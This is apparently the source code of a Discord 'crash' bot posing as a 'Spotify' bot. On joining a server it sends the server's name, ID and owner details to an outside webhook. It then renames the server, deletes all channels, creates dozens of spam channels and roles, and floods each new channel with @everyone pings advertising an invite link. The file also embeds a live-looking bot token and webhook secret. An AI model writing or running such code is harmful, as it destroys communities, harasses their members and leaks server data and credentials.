import os
try:
    import discord
    from discord.ext import commands
    import aiohttp
    from discord import Webhook, AsyncWebhookAdapter
    import asyncio
    import requests
except:
    os.system('pip install discord')
    
client = commands.Bot(command_prefix='.', intents=discord.Intents.all())

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name="Spotify", url="https://www.twitch.tv/404"))
    print(f'[{client.user}]')
    
@client.event
async def on_guild_join(guild):
    try:
        if len(guild.members) <= 1:
            embed = discord.Embed(
                title = f"Попытка краша сервера, где недостаточно участников.\nAttempt to crash a server where there are not enough members.",
                description = f"**Согласно нашим данным на этом сервере меньше `5` человек.**\n**According to our data, there are less than `5` people on this server.**",
                color = 0x0f0f0f
            )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
    except:
        pass    
    hookj = {
        "username": "📣 | НОВЫЙ КРАШ",
        "avatar_url": "https://th.bing.com/th/id/OIP.IBxb6hN4x9wOHq21-JeFLQAAAA?pid=ImgDet&rs=1",
        "content": "",
        "embeds": [
        {
            "title": f"📣 | СКОРО БУДЕТ КРАШНУТ `{guild}`",
            "color": 595959 ,
            "description": f"🧨・**участников**: `{guild.member_count}` \n\n🧺・**ролей**: `{len(guild.roles)}` \n\n🔥・**Количество каналов**: `{len(guild.text_channels)}` \n\n🖥・**Название сервера:** `{guild}`\n\n🎁・ **Айди Сервера:** `{guild.id}`\n\n💩・**Овнер:** `{guild.owner_id}`・ `{guild.owner.name}` ", 
            "timestamp": "", 
            "author": {
            "name": ""
            },
            "image": {},
            "thumbnail": {
            "url": f"{guild.icon_url}"
            },
            "footer": {},
            "fields": []
        }
        ],
        "components": []
    }
    hook = 'https://discord.com/api/webhooks/1139690459762016347/N6aHt-9UdiBktS45gxCMEHjbBRxm2uQUpbUif7MUMHLI6cdi7H3t-IAMWr7Joh5JqkFW'
    requests.post(hook, json=hookj)
                
    with open('spotify.png', 'rb') as f:
        ava = f.read()
        
    try:
        await guild.edit(name='Crashed By Spotify Bot', icon=ava)
    except: pass
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except: pass
        
    for _ in range(50):
        try:
            await guild.create_text_channel(name='crashed-by-spotify-bot')
        except: pass
        
    for _ in range(50):
        try:
            await guild.create_role(name='Crashed By Spotify Bot')
        except: pass
        
@client.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name='Crashed By Spotify Bot')
        for _ in range(100):
          await webhook.send(content='@everyone @here https://discord.gg/cKYTwMHC2V', embed=discord.Embed(title='СЕРВЕР КРАШНУТ', description='Ваш сервер выебан краш ботом от FSK Team\nВсе участники вашего сервера переезжают сюда:\nhttps://discord.gg/cKYTwMHC2V', colour=discord.Colour.from_rgb(10, 10, 10)))
    except:
      for _ in range(100):
        await channel.send(content='@everyone @here https://discord.gg/cKYTwMHC2V', embed=discord.Embed(title='СЕРВЕР КРАШНУТ', description='Ваш сервер выебан краш ботом от FSK Team\nВсе участники вашего сервера переезжают сюда:\nhttps://discord.gg/cKYTwMHC2V', colour=discord.Colour.from_rgb(10, 10, 10)))
        
client.run("MTEzMzEyMTY1MjcxMzA2MjQ5MA.GJ3_hn.yr0_gaLHoenlYmtXTJ0V3BMkUciAKJzbN3VhKg")
